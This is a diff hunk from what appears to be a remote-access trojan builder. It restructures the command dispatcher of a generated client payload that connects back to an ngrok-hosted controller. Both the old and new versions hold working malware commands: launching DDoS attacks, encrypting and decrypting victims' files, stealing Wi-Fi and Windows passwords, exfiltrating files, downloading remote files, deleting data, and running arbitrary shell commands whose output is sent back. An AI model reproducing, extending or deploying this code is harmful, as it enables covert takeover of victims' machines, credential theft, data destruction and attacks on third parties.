@@ -4434,121 +4434,124 @@ OS:       {sys.platform}
         else:
             os.system(f'open {website}')
     def run_cmd(self):
-        if self.fileeditor:
-            if self.msg.startswith("!stopedit"):
-                self.send(f"File editor closed for {self.filename}.")
-                self.fileeditor = False
-            else:
-                try:
-                    self.msg = "\\n"+self.msg
-                except:
-                    self.msg = "\\n".encode()+self.msg
-                self.file = open(self.filename, "rb")
-                contents = self.file.read()
-                self.file.close()
-                self.file = open(self.filename, "wb")
-                self.file.write(contents)
-                self.file.write(self.msg.encode())
-                self.file.close()
-        else:
-            if self.msg.startswith('!ddos'):
-                msg = self.msg.split()
-                ip = msg[1]
-                delay = float(msg[2])
-                self.dos = DDoS(ip, delay)
-            elif self.msg.startswith('!stopatk'):
-                try:
-                    self.dos.stopatk()
-                except:
-                    pass
-            elif self.msg.startswith('!changedirdesktop'):
-                self.changedir(self.desktop)
-            elif self.msg.startswith('!openfile'):
-                file = self.returnsecondstr(self.msg)
-                self.openfile(file)
-            elif self.msg.startswith('!changedir'):
-                dir = self.returnsecondstr(self.msg)
-                self.changedir(dir)
-            elif self.msg.startswith('!rmdir'):
-                dir = self.returnsecondstr(self.msg)
-                self.rmdir(dir)
-            elif self.msg.startswith('!rmfile'):
-                file = self.returnsecondstr(self.msg)
-                self.rmfile(file)
-            elif self.msg.startswith('!listdir'):
-                dirlist = self.listdir()
-                self.send(dirlist)
-            elif self.msg.startswith('!encdir'):
-                self.encdir()
-            elif self.msg.startswith('!decdir'):
-                self.decdir()
-            elif self.msg.startswith('!encfile'):
-                file = self.returnsecondstr(self.msg)
-                self.encfile(file)
-            elif self.msg.startswith('!decfile'):
-                file = self.returnsecondstr(self.msg)
-                self.decfile(file)
-            elif self.msg.startswith('!getinfo'):
-                msgtoserv = self.getinfo()
-                self.send(msgtoserv)
-            elif self.msg.startswith('!getip'):
-                self.send(self.getip())
-            elif self.msg.startswith('!getwifi'):
-                wifi_passwords = self.obtainwifipass()
-                self.send(wifi_passwords)
-            elif self.msg.startswith('!savefile'):
-                file = self.returnsecondstr(self.msg)
-                self.sendfile(file)
-            elif self.msg.startswith('!viewfilecontent'):
-                file = self.returnsecondstr(self.msg)
-                self.file_content(file)
-            elif self.msg.startswith('!mkdir'):
-                main_msg = self.msg.split()
-                dirname = main_msg[1]
-                self.mkdir(dirname)
-                self.send(f"Successfully Created {dirname}")
-            elif self.msg.startswith('!getcwd'):
-                self.send(os.getcwd())
-            elif self.msg.startswith('!getos'):
-                self.send(sys.platform)
-            elif self.msg.startswith('!gotowebsite'):
-                main_msg = self.msg.split()
-                url = main_msg[1]
-                self.gotowebsite(url)
-            elif self.msg.startswith('!dwnldfile'):
-                main_msg = self.msg.split()
-                src = main_msg[1]
-                file = main_msg[2]
-                self.getfrinternet(src, file)
-            elif self.msg.startswith('!getpasswords'):
-                if sys.platform == "win32":
-                    passwords = self.main_password_yoinker()
-                    self.connection.send(passwords.encode())
-                else:
-                    self.connection.send("Running on a non-windows machine - Cannot get passwords!")
-            elif self.msg.startswith("!editfile"):
-                try:
-                    main_msg = self.msg.split()
-                    self.editfile = open(str(main_msg[1]),"rb")
-                    self.editfile.close()
-                    self.filename = self.editfile.name
-                    self.fileeditor = True
-                    self.send(f"File editing mode activated for file {self.filename}.")
-                except:
-                    self.send("File cannot be opened on this computer.".encode())
+        try:
+            if self.fileeditor:
+                if self.msg.startswith("!stopedit"):
+                    self.send(f"File editor closed for {self.filename}.")
                     self.fileeditor = False
-            elif self.msg.startswith("!mkfile"):
-                msg_split = self.msg.split()
-                try:
-                    filename = msg_split[1]
-                    file = open(str(filename),"w")
-                    file.close()
-                    self.send(f"File {filename} has been created in {os.getcwd()}.".encode())
-                except:
-                    self.send("Error with creating files.".encode())
+                else:
+                    try:
+                        self.msg = "\\n" + self.msg
+                    except:
+                        self.msg = "\\n".encode() + self.msg
+                    self.file = open(self.filename, "rb")
+                    contents = self.file.read()
+                    self.file.close()
+                    self.file = open(self.filename, "wb")
+                    self.file.write(contents)
+                    self.file.write(self.msg.encode())
+                    self.file.close()
             else:
-                output = os.popen(self.msg).read()
-                self.send(output)
+                if self.msg.startswith('!ddos'):
+                    msg = self.msg.split()
+                    ip = msg[1]
+                    delay = float(msg[2])
+                    self.dos = DDoS(ip, delay)
+                elif self.msg.startswith('!stopatk'):
+                    try:
+                        self.dos.stopatk()
+                    except:
+                        pass
+                elif self.msg.startswith('!changedirdesktop'):
+                    self.changedir(self.desktop)
+                elif self.msg.startswith('!openfile'):
+                    file = self.returnsecondstr(self.msg)
+                    self.openfile(file)
+                elif self.msg.startswith('!changedir'):
+                    dir = self.returnsecondstr(self.msg)
+                    self.changedir(dir)
+                elif self.msg.startswith('!rmdir'):
+                    dir = self.returnsecondstr(self.msg)
+                    self.rmdir(dir)
+                elif self.msg.startswith('!rmfile'):
+                    file = self.returnsecondstr(self.msg)
+                    self.rmfile(file)
+                elif self.msg.startswith('!listdir'):
+                    dirlist = self.listdir()
+                    self.send(dirlist)
+                elif self.msg.startswith('!encdir'):
+                    self.encdir()
+                elif self.msg.startswith('!decdir'):
+                    self.decdir()
+                elif self.msg.startswith('!encfile'):
+                    file = self.returnsecondstr(self.msg)
+                    self.encfile(file)
+                elif self.msg.startswith('!decfile'):
+                    file = self.returnsecondstr(self.msg)
+                    self.decfile(file)
+                elif self.msg.startswith('!getinfo'):
+                    msgtoserv = self.getinfo()
+                    self.send(msgtoserv)
+                elif self.msg.startswith('!getip'):
+                    self.send(self.getip())
+                elif self.msg.startswith('!getwifi'):
+                    wifi_passwords = self.obtainwifipass()
+                    self.send(wifi_passwords)
+                elif self.msg.startswith('!savefile'):
+                    file = self.returnsecondstr(self.msg)
+                    self.sendfile(file)
+                elif self.msg.startswith('!viewfilecontent'):
+                    file = self.returnsecondstr(self.msg)
+                    self.file_content(file)
+                elif self.msg.startswith('!mkdir'):
+                    main_msg = self.msg.split()
+                    dirname = main_msg[1]
+                    self.mkdir(dirname)
+                    self.send(f"Successfully Created {dirname}")
+                elif self.msg.startswith('!getcwd'):
+                    self.send(os.getcwd())
+                elif self.msg.startswith('!getos'):
+                    self.send(sys.platform)
+                elif self.msg.startswith('!gotowebsite'):
+                    main_msg = self.msg.split()
+                    url = main_msg[1]
+                    self.gotowebsite(url)
+                elif self.msg.startswith('!dwnldfile'):
+                    main_msg = self.msg.split()
+                    src = main_msg[1]
+                    file = main_msg[2]
+                    self.getfrinternet(src, file)
+                elif self.msg.startswith('!getpasswords'):
+                    if sys.platform == "win32":
+                        passwords = self.main_password_yoinker()
+                        self.connection.send(passwords.encode())
+                    else:
+                        self.connection.send("Running on a non-windows machine - Cannot get passwords!")
+                elif self.msg.startswith("!editfile"):
+                    try:
+                        main_msg = self.msg.split()
+                        self.editfile = open(str(main_msg[1]), "rb")
+                        self.editfile.close()
+                        self.filename = self.editfile.name
+                        self.fileeditor = True
+                        self.send(f"File editing mode activated for file {self.filename}")
+                    except:
+                        self.send("File cannot be opened on this computer.".encode())
+                        self.fileeditor = False
+                elif self.msg.startswith("!mkfile"):
+                    msg_split = self.msg.split()
+                    try:
+                        filename = msg_split[1]
+                        file = open(str(filename), "w")
+                        file.close()
+                        self.send(f"File {filename} has been created in {os.getcwd()}".encode())
+                    except:
+                        self.send("Error with creating files.".encode())
+                else:
+                    output = os.popen(self.msg).read()
+                    self.send(output)
+        except Exception as e:
+            self.send(f"Error in script: {e}".encode())
 ip = '""" + self.ngroklink + """'
 port = """ + str(self.ngrokport) + """
 key = """ + str(self.key) + """
